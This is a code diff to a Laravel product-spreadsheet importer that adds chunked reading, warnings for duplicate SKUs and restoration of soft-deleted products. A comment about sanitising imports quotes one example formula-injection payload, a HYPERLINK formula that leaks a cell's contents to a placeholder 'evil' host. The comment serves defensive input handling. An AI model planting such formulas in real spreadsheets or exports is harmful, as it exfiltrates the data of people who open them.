@@ -7,13 +7,14 @@ namespace App\Imports;
 use App\Models\Inventory\Product;
 use App\Models\Inventory\ProductCategory;
 use App\Models\Inventory\ProductLocation;
+use App\Support\SpreadsheetSafety;
 use Illuminate\Support\Collection;
 use Illuminate\Support\Facades\Validator;
-use Maatwebsite\Excel\Concerns\ToCollection;
-use Maatwebsite\Excel\Concerns\WithHeadingRow;
-use Maatwebsite\Excel\Concerns\WithValidation;
-use Maatwebsite\Excel\Concerns\SkipsOnFailure;
 use Maatwebsite\Excel\Concerns\SkipsFailures;
+use Maatwebsite\Excel\Concerns\SkipsOnFailure;
+use Maatwebsite\Excel\Concerns\ToCollection;
+use Maatwebsite\Excel\Concerns\WithChunkReading;
+use Maatwebsite\Excel\Concerns\WithHeadingRow;
 
 /**
  * Import class for processing product data from Excel files.
@@ -21,7 +22,7 @@ use Maatwebsite\Excel\Concerns\SkipsFailures;
  * Handles importing and updating products from spreadsheet data,
  * including automatic creation of categories and locations.
  */
-final class ProductsImport implements ToCollection, WithHeadingRow, SkipsOnFailure
+final class ProductsImport implements SkipsOnFailure, ToCollection, WithChunkReading, WithHeadingRow
 {
     use SkipsFailures;
 
@@ -54,9 +55,29 @@ final class ProductsImport implements ToCollection, WithHeadingRow, SkipsOnFailu
     protected $errors = [];
 
     /**
+     * Non-fatal warnings (e.g. duplicate SKUs collapsed within one file).
+     *
+     * @var array
+     */
+    protected $warnings = [];
+
+    /**
+     * SKUs already processed in this import, to detect intra-file duplicates.
+     *
+     * @var array<string, true>
+     */
+    protected $seenSkus = [];
+
+    /**
+     * Rows processed so far, so error/warning row numbers stay absolute across
+     * chunks (WithChunkReading re-indexes each chunk from 0).
+     */
+    protected int $rowOffset = 0;
+
+    /**
      * Create a new import instance.
      *
-     * @param int $organizationId The organization to import products into
+     * @param  int  $organizationId  The organization to import products into
      */
     public function __construct($organizationId)
     {
@@ -69,6 +90,10 @@ final class ProductsImport implements ToCollection, WithHeadingRow, SkipsOnFailu
     public function collection(Collection $rows)
     {
         foreach ($rows as $index => $row) {
+            // Absolute row number across chunks (+2 for the header row and the
+            // 0-based index).
+            $rowNumber = $this->rowOffset + $index + 2;
+
             try {
                 // Validate the row
                 $validator = Validator::make($row->toArray(), [
@@ -81,15 +106,30 @@ final class ProductsImport implements ToCollection, WithHeadingRow, SkipsOnFailu
 
                 if ($validator->fails()) {
                     $this->errors[] = [
-                        'row' => $index + 2, // +2 for header and 0-index
+                        'row' => $rowNumber,
                         'errors' => $validator->errors()->all(),
                     ];
+
                     continue;
                 }
 
+                // Collapse intra-file duplicate SKUs: keep the first occurrence
+                // and warn, rather than silently letting a later row overwrite
+                // the product created earlier in the same file.
+                $sku = (string) $row['sku'];
+                if (isset($this->seenSkus[$sku])) {
+                    $this->warnings[] = [
+                        'row' => $rowNumber,
+                        'warnings' => ["Duplicate SKU '{$sku}' in this file — row skipped (first occurrence kept)."],
+                    ];
+
+                    continue;
+                }
+                $this->seenSkus[$sku] = true;
+
                 // Find or create category
                 $categoryId = null;
-                if (!empty($row['category'])) {
+                if (! empty($row['category'])) {
                     $category = ProductCategory::firstOrCreate(
                         [
                             'name' => $row['category'],
@@ -103,7 +143,7 @@ final class ProductsImport implements ToCollection, WithHeadingRow, SkipsOnFailu
                 // code so importing "Toronto Main" and later "Toronto Backup"
                 // doesn't produce two locations sharing code='TOR'.
                 $locationId = null;
-                if (!empty($row['location'])) {
+                if (! empty($row['location'])) {
                     $location = ProductLocation::firstOrCreate(
                         [
                             'name' => $row['location'],
@@ -116,8 +156,12 @@ final class ProductsImport implements ToCollection, WithHeadingRow, SkipsOnFailu
                     $locationId = $location->id;
                 }
 
-                // Check if product exists (by SKU)
-                $product = Product::where('sku', $row['sku'])
+                // Check if product exists (by SKU) — include soft-deleted rows:
+                // the SKU unique index counts them, so a plain lookup would miss
+                // a trashed product and then collide on create. Restore + update
+                // instead.
+                $product = Product::withTrashed()
+                    ->where('sku', $row['sku'])
                     ->where('organization_id', $this->organizationId)
                     ->first();
 
@@ -130,7 +174,7 @@ final class ProductsImport implements ToCollection, WithHeadingRow, SkipsOnFailu
                 //   name = =HYPERLINK("https://evil/?leak="&A2,"safe")
                 // doesn't land in the DB and re-export to a downloader
                 // whose spreadsheet viewer evaluates it.
-                $sanitise = fn ($v) => \App\Support\SpreadsheetSafety::sanitiseImport($v);
+                $sanitise = fn ($v) => SpreadsheetSafety::sanitiseImport($v);
 
                 $productData = [
                     'name' => $sanitise($row['name']),
@@ -150,7 +194,11 @@ final class ProductsImport implements ToCollection, WithHeadingRow, SkipsOnFailu
                 ];
 
                 if ($product) {
-                    // Update existing product
+                    // Update existing product, restoring it first if it was
+                    // soft-deleted so re-importing a deleted SKU brings it back.
+                    if ($product->trashed()) {
+                        $product->restore();
+                    }
                     $product->update($productData);
                     $this->updated++;
                 } else {
@@ -160,11 +208,23 @@ final class ProductsImport implements ToCollection, WithHeadingRow, SkipsOnFailu
                 }
             } catch (\Exception $e) {
                 $this->errors[] = [
-                    'row' => $index + 2,
+                    'row' => $rowNumber,
                     'errors' => [$e->getMessage()],
                 ];
             }
         }
+
+        // Advance the absolute-row offset for the next chunk.
+        $this->rowOffset += $rows->count();
+    }
+
+    /**
+     * Read the file in chunks so large uploads don't materialise the whole
+     * sheet in memory and OOM the import worker.
+     */
+    public function chunkSize(): int
+    {
+        return 500;
     }
 
     /**
@@ -176,6 +236,7 @@ final class ProductsImport implements ToCollection, WithHeadingRow, SkipsOnFailu
             'imported' => $this->imported,
             'updated' => $this->updated,
             'errors' => $this->errors,
+            'warnings' => $this->warnings,
         ];
     }
 
@@ -199,7 +260,7 @@ final class ProductsImport implements ToCollection, WithHeadingRow, SkipsOnFailu
                 ->exists()
         ) {
             $suffix++;
-            $code = $base . '-' . $suffix;
+            $code = $base.'-'.$suffix;
         }
 
         return $code;
